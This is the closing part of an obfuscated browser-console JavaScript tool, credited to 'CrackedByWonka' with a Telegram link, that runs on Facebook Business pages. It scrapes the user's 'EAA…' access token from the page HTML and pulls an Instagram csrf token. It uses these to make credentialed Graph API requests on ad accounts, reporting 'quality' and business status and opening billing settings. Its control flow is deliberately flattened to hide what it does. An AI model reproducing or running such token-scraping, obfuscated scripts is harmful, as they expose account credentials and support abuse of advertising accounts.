                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                                MRFpb.value = "⌛BusinessInformation...⌛";
                                                                console.log("⌛GettingBusinessInformation...⌛");
                                                                QAYob.value = "⌛BusinessStatus:-...⌛";
                                                                MxSob.value = "BusinessStatus:-";
                                                            });
                                                            QwNsb.appendChild(document.createElement("br"));
                                                            varozVob = document.createElement("label");
                                                            ozVob.innerText = "BusinessStatus:";
                                                            ozVob.style.display = "block";
                                                            QwNsb.appendChild(ozVob);
                                                            varQAYob = document.createElement("input");
                                                            QAYob.type = "text";
                                                            QAYob.placeholder = "BmStatus";
                                                            QAYob.style.width = "100%";
                                                            QAYob.style.height = "20px";
                                                            QAYob.style.marginBottom = "10px";
                                                            QAYob.style.display = "block";
                                                            QwNsb.appendChild(QAYob);
                                                            varkwPob = document.createElement("label");
                                                            kwPob.innerText = "LimitBusiness:";
                                                            kwPob.style.display = "block";
                                                            QwNsb.appendChild(kwPob);
                                                            varMxSob = document.createElement("input");
                                                            MxSob.type = "text";
                                                            MxSob.placeholder = "BmStatus";
                                                            MxSob.style.width = "100%";
                                                            MxSob.style.height = "20px";
                                                            MxSob.style.marginBottom = "10px";
                                                            MxSob.style.display = "block";
                                                            QwNsb.appendChild(MxSob);
                                                            vargtJob = document.createElement("button");
                                                            gtJob.textContent = "X";
                                                            gtJob.style.position = "absolute";
                                                            gtJob.style.top = "10px";
                                                            gtJob.style.right = "10px";
                                                            gtJob.style.width = "30px";
                                                            gtJob.style.height = "30px";
                                                            gtJob.style.border = "none";
                                                            gtJob.style.borderRadius = "50%";
                                                            gtJob.style.background = "red";
                                                            gtJob.style.color = "black";
                                                            gtJob.style.fontSize = "16px";
                                                            QwNsb.appendChild(gtJob);
                                                            gtJob.addEventListener("click", function() {
                                                                QwNsb.style.display = "none";
                                                            });
                                                        });
                                                        MFck.appendChild(Qcasb);
                                                        varIuMob = document.createElement("button");
                                                        IuMob.textContent = "🔎CheckAdAccountQuality🔎";
                                                        IuMob.style.width = "100%";
                                                        IuMob.style.height = "30px";
                                                        IuMob.style.marginBottom = "10px";
                                                        IuMob.style.backgroundColor = "green";
                                                        IuMob.style.color = "white";
                                                        IuMob.addEventListener("click", function() {
                                                            varkUNlb = document.createElement("div");
                                                            kUNlb.style.position = "fixed";
                                                            kUNlb.style.top = "50%";
                                                            kUNlb.style.left = "50%";
                                                            kUNlb.style.transform = "translate(-50%,-50%)";
                                                            kUNlb.style.width = "500px";
                                                            kUNlb.style.padding = "50px";
                                                            kUNlb.style.background = "white";
                                                            kUNlb.style.color = "black";
                                                            kUNlb.style.borderRadius = "10px";
                                                            kUNlb.style.boxShadow = "0010pxrgba(0,0,0,0.5)";
                                                            kUNlb.style.zIndex = "9999";
                                                            document.body.appendChild(kUNlb);
                                                            varMVQlb = document.createElement("div");
                                                            MVQlb.textContent = "❤️صلواعليرسولاللهصلياللهعليهوسلم❤️";
                                                            MVQlb.style.textAlign = "center";
                                                            MVQlb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(MVQlb);
                                                            vargRHlb = document.createElement("div");
                                                            gRHlb.textContent = "❤️سبحاناللهوبحمدهسبحاناللهالعظيم❤️";
                                                            gRHlb.style.textAlign = "center";
                                                            gRHlb.style.marginBottom = "25px";
                                                            kUNlb.appendChild(gRHlb);
                                                            varISKlb = document.createElement("div");
                                                            ISKlb.textContent = "❤️CheckAdAccountQuality!for:CrackedByWonka=Jerusalem❤️";
                                                            ISKlb.style.textAlign = "center";
                                                            ISKlb.style.marginBottom = "25px";
                                                            kUNlb.appendChild(ISKlb);
                                                            varcOBlb = document.createElement("div");
                                                            cOBlb.textContent = "❤️CrackedByWonka=Jerusalem❤️";
                                                            cOBlb.style.textAlign = "center";
                                                            cOBlb.style.marginBottom = "25px";
                                                            kUNlb.appendChild(cOBlb);
                                                            varEPElb = document.createElement("button");
                                                            EPElb.textContent = "CheckAccountForGoodAdIban👩‍💻";
                                                            EPElb.style.display = "block";
                                                            EPElb.style.margin = "0auto";
                                                            EPElb.style.padding = "10px20px";
                                                            EPElb.style.background = "Red";
                                                            EPElb.style.color = "white";
                                                            EPElb.style.border = "none";
                                                            EPElb.style.borderRadius = "5px";
                                                            kUNlb.appendChild(EPElb);
                                                            varYKvlb = document.createElement("button");
                                                            YKvlb.textContent = "PleaseWait👩‍💻";
                                                            YKvlb.style.display = "none";
                                                            YKvlb.style.margin = "0auto";
                                                            YKvlb.style.padding = "10px20px";
                                                            YKvlb.style.background = "Red";
                                                            YKvlb.style.color = "white";
                                                            YKvlb.style.border = "none";
                                                            YKvlb.style.borderRadius = "5px";
                                                            kUNlb.appendChild(YKvlb);
                                                            EPElb.addEventListener("click", function() {
                                                                EPElb.style.display = "none";
                                                                YKvlb.style.display = "block";
                                                                varAMylb = orHmb.value;
                                                                varAgmmb = wxTmb.value;
                                                                varcipmb = IGlnb.value;
                                                                fetch("https://graph.facebook.com/v16.0/act_".concat(AMylb, "?access_token=").concat(cipmb, "&_flowletID=152"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "accept", "*/*"), "accept-language", "en-US,en;q=0.9"), "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not_ABrand";v="8","Chromium";v="120","MicrosoftEdge";v="120"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"'), "sec-fetch-dest", "empty"), "sec-fetch-mode", "cors"), "sec-fetch-site", "same-site")), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", "_reqName=adaccount&_reqSrc=AdsAccountDataLoader&fields=%5B%22account_currency_ratio_to_usd%22%2C%22account_id%22%2C%22account_status%22%2C%22ads_creation_saved_state%7Bserialized_store_data%7D%22%2C%22adtrust_dsl%22%2C%22advertiser_verification_status%22%2C%22archived_adgroup_count%22%2C%22archived_campaign_count%22%2C%22archived_campaign_group_count%22%2C%22attr_window_deprecation_group%22%2C%22attribution_spec%22%2C%22auth_flow_for_trust_tier_state%22%2C%22authorized_country_for_political_ads%22%2C%22average_daily_campaign_budget%22%2C%22average_daily_campaign_group_budget%22%2C%22average_lifetime_campaign_budget%22%2C%22average_lifetime_campaign_group_budget%22%2C%22brand_safety_content_filter_levels%22%2C%22brand_safety_excluded_topics%22%2C%22brand_safety_inherited_content_filter_levels%22%2C%22business%22%2C%22business_country_code%22%2C%22business_restriction_reason%22%2C%22business_verification_status%22%2C%22businessprojects%7Bbusiness%2Cname%7D%22%2C%22can_bypass_fs_check%22%2C%22capabilities%22%2C%22created_time%22%2C%22ctwa_smb_enforcing_days_left%22%2C%22currency%22%2C%22default_dsa_beneficiary%22%2C%22default_dsa_payor%22%2C%22default_unified_attribution_spec%22%2C%22disable_reason%22%2C%22dynamic_probation_dsl%22%2C%22end_advertiser_name%22%2C%22flex_single_objective%22%2C%22funding_source%22%2C%22has_migrated_permissions%22%2C%22has_started_purchase_optimized_ctm_ad_within_1d%22%2C%22incremental_conversion_optimization_ad_studies%22%2C%22io_number%22%2C%22is_attribution_spec_system_default%22%2C%22is_biz_migration_eligible%22%2C%22is_business_allowed_to_advertise%22%2C%22is_business_verification_eligible%22%2C%22is_ctx_advertiser%22%2C%22is_mi_billing_info_updated%22%2C%22is_new_advertiser%22%2C%22is_shopless_awpt_eligible%22%2C%22is_tax_id_required%22%2C%22is_tier_0%22%2C%22is_tier_0_full%22%2C%22is_tier_1%22%2C%22is_tier_restricted%22%2C%22is_user_allowed_to_advertise%22%2C%22line_numbers%22%2C%22min_campaign_group_spend_cap%22%2C%22min_daily_budget%22%2C%22modeled_reporting_type%22%2C%22moo_default_conversion_bid%22%2C%22name%22%2C%22naming_templates.fields(api_fields%2Capi_version%2Cfield_order%2Ctemplate_version%2Clevel%2Cseparator%2Cvalue_separator%2Cuser_defined_fields)%22%2C%22offsite_pixels_tos_accepted%22%2C%22onbehalf_requests%7Breceiving_business%2Cstatus%7D%22%2C%22page_authorized_country_for_political_ads%22%2C%22pages_in_authorizations%22%2C%22rf_spec%22%2C%22self_resolve_uri%22%2C%22timezone_id%22%2C%22timezone_name%22%2C%22timezone_offset_hours_utc%22%2C%22timezoneoffsets%22%2C%22tos_accepted%22%2C%22user_settings%22%2C%22user_tos_accepted%22%2C%22userpermissions.fields(role).user(".concat(Agmmb, ")%22%2C%22users%22%5D&locale=en_US&method=get&pretty=0&suppress_http_code=1&xref=f1f62880494601c")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(wdgmb) {
                                                                    wdgmb.json().then(function(Yejmb) {
                                                                        varsaamb = newDate(Yejmb.created_time);
                                                                        varUbdmb = newIntl.DateTimeFormat("en-US", _defineProperty(_defineProperty(_defineProperty({}, "year", "numeric"), "month", "2-digit"), "day", "2-digit")).format(saamb);
                                                                        varoXTlb = newIntl.DateTimeFormat("en-US", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "hour", "2-digit"), "minute", "2-digit"), "second", "2-digit"), "timeZoneName", "short")).format(saamb);
                                                                        console.log("CreationDate:");
                                                                        console.log(Ubdmb);
                                                                        EDfnb.value = "CreationDate:" + Ubdmb;
                                                                        console.log("CreationTime:");
                                                                        console.log(oXTlb);
                                                                        YyWmb.value = "CreationTime:" + oXTlb;
                                                                        varQYWlb = Yejmb.is_new_advertiser;
                                                                        console.log("is_new_advertiser:", QYWlb);
                                                                        vara = 0;
                                                                        while (a < 65535) {
                                                                            switch (a) {
                                                                                case0: a = QYWlb ? 1 : 2;
                                                                                break;
                                                                                case1: a = 65535; {
                                                                                    AAZmb.value = "QualityStatus:Bad❌";
                                                                                    wVRjb.value = "QualityStatus:Bad❌";
                                                                                }
                                                                                break;
                                                                                case2: a = 65535; {
                                                                                    AAZmb.value = "QualityStatus:Good✅";
                                                                                    wVRjb.value = "QualityStatus:Good✅";
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                        YKvlb.style.display = "none";
                                                                        EPElb.style.display = "block";
                                                                    });
                                                                }).catch(function(suNmb) {
                                                                    console.error(suNmb);
                                                                    console.log("ErroroccurredwhilesendingRequest");
                                                                });
                                                            });
                                                            varMpEmb = document.createElement("label");
                                                            MpEmb.innerText = "TargetAdaccountID:";
                                                            kUNlb.appendChild(MpEmb);
                                                            varorHmb = document.createElement("input");
                                                            orHmb.placeholder = "EnterAdaccountID";
                                                            orHmb.style.width = "100%";
                                                            orHmb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(orHmb);
                                                            varImymb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                            orHmb.value = Imymb;
                                                            varkoBmb = document.body.innerHTML;
                                                            varEjsmb = koBmb.match(/"accessToken":"(EAA[^"]+)"/);
                                                            varglvmb = Ejsmb ? Ejsmb[1] : "";
                                                            access_token = glvmb;
                                                            vargFinb = document.createElement("label");
                                                            gFinb.innerText = "AccessToken:";
                                                            kUNlb.appendChild(gFinb);
                                                            varIGlnb = document.createElement("textarea");
                                                            IGlnb.placeholder = "EnterAccessToken:";
                                                            IGlnb.style.width = "100%";
                                                            IGlnb.style.height = "70px";
                                                            IGlnb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(IGlnb);
                                                            varcCcnb = glvmb;
                                                            IGlnb.value = cCcnb;
                                                            varEDfnb = document.createElement("textarea");
                                                            EDfnb.placeholder = "CreationDate!";
                                                            EDfnb.style.width = "100%";
                                                            EDfnb.style.height = "50px";
                                                            EDfnb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(EDfnb);
                                                            varYyWmb = document.createElement("textarea");
                                                            YyWmb.placeholder = "CreationTime!";
                                                            YyWmb.style.width = "100%";
                                                            YyWmb.style.height = "50px";
                                                            YyWmb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(YyWmb);
                                                            varAAZmb = document.createElement("textarea");
                                                            AAZmb.placeholder = "QualityStatus!";
                                                            AAZmb.style.width = "100%";
                                                            AAZmb.style.height = "50px";
                                                            AAZmb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(AAZmb);
                                                            varUvQmb = document.createElement("label");
                                                            UvQmb.innerText = "USERID:";
                                                            kUNlb.appendChild(UvQmb);
                                                            varwxTmb = document.createElement("input");
                                                            wxTmb.placeholder = "EnteruserID";
                                                            wxTmb.style.width = "100%";
                                                            wxTmb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(wxTmb);
                                                            varYWUjb = require("CurrentUserInitialData").USER_ID;
                                                            wxTmb.value = YWUjb;
                                                            varAYXjb = document.createElement("div");
                                                            AYXjb.textContent = "❤️AccountQuality❤️";
                                                            AYXjb.style.textAlign = "center";
                                                            AYXjb.style.marginBottom = "10px";
                                                            kUNlb.appendChild(AYXjb);
                                                            varUTOjb = document.createElement("div");
                                                            UTOjb.style.display = "flex";
                                                            kUNlb.appendChild(UTOjb);
                                                            varwVRjb = document.createElement("input");
                                                            wVRjb.type = "text";
                                                            wVRjb.placeholder = "EnterHash";
                                                            wVRjb.style.width = "50%";
                                                            wVRjb.style.height = "20px";
                                                            wVRjb.style.marginBottom = "10px";
                                                            UTOjb.appendChild(AYXjb);
                                                            UTOjb.appendChild(wVRjb);
                                                            wVRjb.style.color = "red";
                                                            varQQIjb = document.createElement("button");
                                                            QQIjb.textContent = "GenTOKEN";
                                                            QQIjb.style.display = "none";
                                                            QQIjb.style.width = "30%";
                                                            QQIjb.style.height = "20px";
                                                            QQIjb.style.marginBottom = "10px";
                                                            QQIjb.style.backgroundColor = "green";
                                                            QQIjb.style.color = "white";
                                                            kUNlb.appendChild(QQIjb);
                                                            QQIjb.addEventListener("click", function() {
                                                                fetch("https://www.instagram.com/").then(function(sSLjb) {
                                                                    returnsSLjb.text();
                                                                }).then(function(MNCjb) {
                                                                    varoPFjb = /"csrf_token":"([^"]+)"/;
                                                                    varojtkb = MNCjb.match(oPFjb);
                                                                    varb = 0;
                                                                    while (b < 65535) {
                                                                        switch (b) {
                                                                            case0: b = ojtkb && ojtkb.length > 1 ? 1 : 2;
                                                                            break;
                                                                            case1: b = 65535; {
                                                                                varkgnkb = ojtkb[1];
                                                                                wVRjb.value = kgnkb;
                                                                            }
                                                                            break;
                                                                            case2: b = 65535; {
                                                                                alert("⚠️YourIPBlockedfromInstagramserver⚠️❌");
                                                                                location.reload();
                                                                            }
                                                                            break;
                                                                        }
                                                                    }
                                                                });
                                                            });
                                                            varMhqkb = wVRjb.value;
                                                            vargdhkb = orHmb.value;
                                                            varIekkb = wxTmb.value;
                                                            varcabkb = IGlnb.value;
                                                            fetch("https://graph.facebook.com/v16.0/act_".concat(gdhkb, "?access_token=").concat(cabkb, "&_flowletID=152"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "accept", "*/*"), "accept-language", "en-US,en;q=0.9"), "content-type", "application/x-www-form-urlencoded"), "sec-ch-ua", '"Not_ABrand";v="8","Chromium";v="120","MicrosoftEdge";v="120"'), "sec-ch-ua-mobile", "?0"), "sec-ch-ua-platform", '"Windows"'), "sec-fetch-dest", "empty"), "sec-fetch-mode", "cors"), "sec-fetch-site", "same-site")), "referrer", "https://business.facebook.com/"), "referrerPolicy", "origin-when-cross-origin"), "body", "_reqName=adaccount&_reqSrc=AdsAccountDataLoader&fields=%5B%22account_currency_ratio_to_usd%22%2C%22account_id%22%2C%22account_status%22%2C%22ads_creation_saved_state%7Bserialized_store_data%7D%22%2C%22adtrust_dsl%22%2C%22advertiser_verification_status%22%2C%22archived_adgroup_count%22%2C%22archived_campaign_count%22%2C%22archived_campaign_group_count%22%2C%22attr_window_deprecation_group%22%2C%22attribution_spec%22%2C%22auth_flow_for_trust_tier_state%22%2C%22authorized_country_for_political_ads%22%2C%22average_daily_campaign_budget%22%2C%22average_daily_campaign_group_budget%22%2C%22average_lifetime_campaign_budget%22%2C%22average_lifetime_campaign_group_budget%22%2C%22brand_safety_content_filter_levels%22%2C%22brand_safety_excluded_topics%22%2C%22brand_safety_inherited_content_filter_levels%22%2C%22business%22%2C%22business_country_code%22%2C%22business_restriction_reason%22%2C%22business_verification_status%22%2C%22businessprojects%7Bbusiness%2Cname%7D%22%2C%22can_bypass_fs_check%22%2C%22capabilities%22%2C%22created_time%22%2C%22ctwa_smb_enforcing_days_left%22%2C%22currency%22%2C%22default_dsa_beneficiary%22%2C%22default_dsa_payor%22%2C%22default_unified_attribution_spec%22%2C%22disable_reason%22%2C%22dynamic_probation_dsl%22%2C%22end_advertiser_name%22%2C%22flex_single_objective%22%2C%22funding_source%22%2C%22has_migrated_permissions%22%2C%22has_started_purchase_optimized_ctm_ad_within_1d%22%2C%22incremental_conversion_optimization_ad_studies%22%2C%22io_number%22%2C%22is_attribution_spec_system_default%22%2C%22is_biz_migration_eligible%22%2C%22is_business_allowed_to_advertise%22%2C%22is_business_verification_eligible%22%2C%22is_ctx_advertiser%22%2C%22is_mi_billing_info_updated%22%2C%22is_new_advertiser%22%2C%22is_shopless_awpt_eligible%22%2C%22is_tax_id_required%22%2C%22is_tier_0%22%2C%22is_tier_0_full%22%2C%22is_tier_1%22%2C%22is_tier_restricted%22%2C%22is_user_allowed_to_advertise%22%2C%22line_numbers%22%2C%22min_campaign_group_spend_cap%22%2C%22min_daily_budget%22%2C%22modeled_reporting_type%22%2C%22moo_default_conversion_bid%22%2C%22name%22%2C%22naming_templates.fields(api_fields%2Capi_version%2Cfield_order%2Ctemplate_version%2Clevel%2Cseparator%2Cvalue_separator%2Cuser_defined_fields)%22%2C%22offsite_pixels_tos_accepted%22%2C%22onbehalf_requests%7Breceiving_business%2Cstatus%7D%22%2C%22page_authorized_country_for_political_ads%22%2C%22pages_in_authorizations%22%2C%22rf_spec%22%2C%22self_resolve_uri%22%2C%22timezone_id%22%2C%22timezone_name%22%2C%22timezone_offset_hours_utc%22%2C%22timezoneoffsets%22%2C%22tos_accepted%22%2C%22user_settings%22%2C%22user_tos_accepted%22%2C%22userpermissions.fields(role).user(".concat(Iekkb, ")%22%2C%22users%22%5D&locale=en_US&method=get&pretty=0&suppress_http_code=1&xref=f1f62880494601c")), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(Ebekb) {
                                                                Ebekb.json().then(function(EvRkb) {
                                                                    vargxUkb = newDate(EvRkb.created_time);
                                                                    varAsLkb = newIntl.DateTimeFormat("en-US", _defineProperty(_defineProperty(_defineProperty({}, "year", "numeric"), "month", "2-digit"), "day", "2-digit")).format(gxUkb);
                                                                    varcuOkb = newIntl.DateTimeFormat("en-US", _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "hour", "2-digit"), "minute", "2-digit"), "second", "2-digit"), "timeZoneName", "short")).format(gxUkb);
                                                                    console.log("CreationDate:");
                                                                    console.log(AsLkb);
                                                                    EDfnb.value = "CreationDate:" + AsLkb;
                                                                    console.log("CreationTime:");
                                                                    console.log(cuOkb);
                                                                    YyWmb.value = "CreationTime:" + cuOkb;
                                                                    varwpFkb = EvRkb.is_new_advertiser;
                                                                    console.log("is_new_advertiser:", wpFkb);
                                                                    varc = 0;
                                                                    while (c < 65535) {
                                                                        switch (c) {
                                                                            case0: c = wpFkb ? 1 : 2;
                                                                            break;
                                                                            case1: c = 65535; {
                                                                                AAZmb.value = "QualityStatus:Bad❌";
                                                                                wVRjb.value = "QualityStatus:Bad❌";
                                                                            }
                                                                            break;
                                                                            case2: c = 65535; {
                                                                                AAZmb.value = "QualityStatus:Good✅";
                                                                                wVRjb.value = "QualityStatus:Good✅";
                                                                            }
                                                                            break;
                                                                        }
                                                                    }
                                                                    YKvlb.style.display = "none";
                                                                    EPElb.style.display = "block";
                                                                });
                                                            }).catch(function(smzkb) {
                                                                console.error(smzkb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            varUnCkb = document.createElement("button");
                                                            UnCkb.textContent = "X";
                                                            UnCkb.style.position = "absolute";
                                                            UnCkb.style.top = "10px";
                                                            UnCkb.style.right = "10px";
                                                            UnCkb.style.width = "30px";
                                                            UnCkb.style.height = "30px";
                                                            UnCkb.style.border = "none";
                                                            UnCkb.style.borderRadius = "50%";
                                                            UnCkb.style.background = "red";
                                                            UnCkb.style.color = "black";
                                                            UnCkb.style.fontSize = "16px";
                                                            kUNlb.appendChild(UnCkb);
                                                            UnCkb.addEventListener("click", function() {
                                                                kUNlb.style.display = "none";
                                                            });
                                                        });
                                                        MFck.appendChild(IuMob);
                                                        varUHplb = document.createElement("button");
                                                        UHplb.textContent = "❤️CreatedWith❤️By:CrackedByWonka=Jerusalem";
                                                        UHplb.style.width = "100%";
                                                        UHplb.style.height = "30px";
                                                        UHplb.style.marginBottom = "10px";
                                                        UHplb.style.backgroundColor = "red";
                                                        UHplb.style.color = "white";
                                                        UHplb.addEventListener("click", function() {
                                                            window.open("https://t.me/Dragonwore", "_blank");
                                                        });
                                                        MFck.appendChild(UHplb);
                                                        varwJslb = document.createElement("button");
                                                        wJslb.textContent = "X";
                                                        wJslb.style.position = "absolute";
                                                        wJslb.style.top = "10px";
                                                        wJslb.style.right = "10px";
                                                        wJslb.style.width = "30px";
                                                        wJslb.style.height = "30px";
                                                        wJslb.style.border = "none";
                                                        wJslb.style.borderRadius = "50%";
                                                        wJslb.style.background = "red";
                                                        wJslb.style.color = "white";
                                                        wJslb.style.fontSize = "16px";
                                                        MFck.appendChild(wJslb);
                                                        wJslb.addEventListener("click", function() {
                                                            MFck.style.display = "none";
                                                        });
                                                        varQEjlb = document.createElement("label");
                                                        QEjlb.textContent = "RemainingDays⏱️:";
                                                        QEjlb.style.cssText = "display:block;margin-top:20px;text-align:center;color:red;";
                                                        MFck.appendChild(QEjlb);
                                                        varsGmlb = document.createElement("input");
                                                        sGmlb.type = "text";
                                                        sGmlb.style.cssText = "width:100%;padding:10px;text-align:center;color:red;border:1pxsolidred;border-radius:5px;margin-bottom:20px;";
                                                        MFck.appendChild(sGmlb);
                                                        MBdlb();
                                                        setInterval(MBdlb, 864e5);
                                                    }
                                                    break;
                                                }
                                            };
                                            varp;
                                            varq;
                                            varr;
                                            vars;
                                            vart;
                                            varu;
                                            varv;
                                            varw;
                                            varx;
                                            vary;
                                            varA;
                                            varB;
                                            while (o < 65535) {
                                                _loop2();
                                            }
                                        };
                                        caPm();
                                    }
                                    break;
                                    case2: V = 65535; {}
                                    break;
                                }
                            };
                            while (V < 65535) {
                                _loop();
                            }
                        });
                    })["catch"](function(obfib) {
                        console.error(obfib);
                        console.log("ErroroccurredwhilesendingRequest");
                    });
                    console.log("Hello,Myfriend,Codeby:Wonka=Jerusalem(MostafaKamel)!");
                }
                break;
                case2: T = 65535; {
                    varW = 0;
                    while (W < 65535) {
                        switch (W) {
                            case0: W = location.host.indexOf("facebook.com") > -1 ? 1 : 2;
                            break;
                            case1: W = 65535; {
                                location.href = "/billing_hub/payment_settings/?asset_id=";
                            }
                            break;
                            case2: W = 65535; {
                                varX = 0;
                                while (X < 65535) {
                                    switch (X) {
                                        case0: X = confirm("AreyousureyouwanttoopenFacebookAdsManager?") ? 1 : 65535;
                                        break;
                                        case1: X = 65535; {
                                            location.href = "https://business.facebook.com/billing_hub/payment_settings/?asset_id=";
                                        }
                                        break;
                                    }
                                }
                            }
                            break;
                        }
                    }
                }
                break;
            }
        }
    }());
